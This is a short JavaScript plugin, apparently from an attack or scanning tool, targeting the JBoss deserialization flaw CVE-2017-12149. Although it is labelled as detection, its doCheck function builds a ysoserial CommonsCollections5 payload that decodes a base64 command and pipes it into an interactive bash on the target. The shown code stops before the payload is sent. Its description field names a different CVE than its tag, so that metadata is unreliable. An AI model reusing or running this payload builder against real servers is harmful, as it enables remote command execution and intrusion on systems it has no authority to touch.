module.exports={
	tags:"jboss,CVE-2017-12149",
    des:"jboss,CVE-2018-1297,Vulnerability detection",
    dependencies:"java,ysoserial",
    VulApps:[],
    doIted:{},
    urls:["https://github.com/vulhub/vulhub/tree/master/jboss/CVE-2017-12149"],
	doCheck:function (url,fnCbk)
	{
        url = url.trim().replace(/[\s\r\n]*/gmi,'');
        var _t = this,_s = this.self,hst = _s.parseUrl(url);
        hst.port = hst.port||(-1 < hst.protocol.indexOf("https")?443:80);
        var szK = `${hst.hostname}:${hst.port}`;
        if(_t.doIted[szK])return;
        var szCmd = Buffer.from(_s.g_szCmd).toString("base64");
        var szPay1 = _s.child_process.execSync(`java -jar jars/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 "bash -c {echo,${szCmd}}|{base64,-d}|{bash,-i}"`).toString("utf-8");
        _t.doIted[szK] = 1;
	}
};
